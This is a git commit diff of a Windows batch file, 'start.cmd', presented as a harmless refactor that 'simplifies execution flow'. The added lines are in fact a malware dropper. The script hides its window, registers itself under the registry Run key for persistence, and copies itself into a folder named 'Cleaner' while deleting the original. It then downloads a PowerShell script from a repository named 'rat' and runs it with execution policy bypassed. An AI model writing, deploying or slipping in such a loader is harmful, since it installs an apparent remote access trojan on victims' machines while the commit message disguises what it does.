72f9a3a63e8a778c0c17688abb724101049d2404
Guillem <sjeje2553@gmail.com>
2026-02-17 16:47:04 +0100

    Refactor start.cmd to simplify execution flow
    Removed unnecessary startup checks and streamlined the script to directly copy and execute the PowerShell script.

--- start.cmd
+++ start.cmd
@@ -1,16 +1,13 @@
 @echo off
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" goto startup
-goto start 
-:startup
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
+/v MyApp ^
+/t REG_SZ ^
+/d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
+/f
+copy "%~f0" "%APPDATA%\Cleaner\start.cmd"
+del "%~f0"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
-copy "%~dp0cli.ps1" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-
-echo starting updater, do not close
-powershell -ExecutionPolicy Bypass -File cli.ps1
-exit
-
-:start
+copy "%~dp0cli.ps1" "%APPDATA%\Cleaner"
 powershell -ExecutionPolicy Bypass -File cli.ps1
 exit
